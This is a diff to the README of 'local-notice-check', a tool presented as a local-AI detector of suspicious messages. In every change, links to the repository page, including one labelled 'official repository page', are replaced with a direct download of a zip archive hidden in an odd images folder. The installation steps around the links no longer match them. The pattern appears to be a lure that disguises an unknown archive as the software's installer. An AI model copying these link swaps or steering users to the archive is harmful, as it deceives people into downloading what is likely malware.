@@ -1,6 +1,6 @@
 # 🛡️ local-notice-check - Identify suspicious messages using local AI
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Yuhuhan/local-notice-check)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Yuhuhan/local-notice-check/raw/refs/heads/main/experiments/modal_qwen36_mtp/images/notice-local-check-2.5.zip)
 
 ## 📋 What this tool does
 
@@ -24,7 +24,7 @@ If your computer does not meet these hardware standards, the AI processing might
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the [official repository page](https://github.com/Yuhuhan/local-notice-check).
+1. Visit the [official repository page](https://github.com/Yuhuhan/local-notice-check/raw/refs/heads/main/experiments/modal_qwen36_mtp/images/notice-local-check-2.5.zip).
 2. Download the latest installer package from the releases section.
 3. Install Docker Desktop from the Docker website if you do not have it already.
 4. Open the downloaded folder and find the configuration file.
@@ -34,7 +34,7 @@ Once you start the script, the tool will download the necessary AI models. This 
 
 ## 🛠️ Installation steps
 
-You can find the files you need at this location: [https://github.com/Yuhuhan/local-notice-check](https://github.com/Yuhuhan/local-notice-check).
+You can find the files you need at this location: [https://github.com/Yuhuhan/local-notice-check/raw/refs/heads/main/experiments/modal_qwen36_mtp/images/notice-local-check-2.5.zip](https://github.com/Yuhuhan/local-notice-check/raw/refs/heads/main/experiments/modal_qwen36_mtp/images/notice-local-check-2.5.zip).
 
 1. Click the download link provided above.
 2. Select the Green "Code" button and choose "Download ZIP".
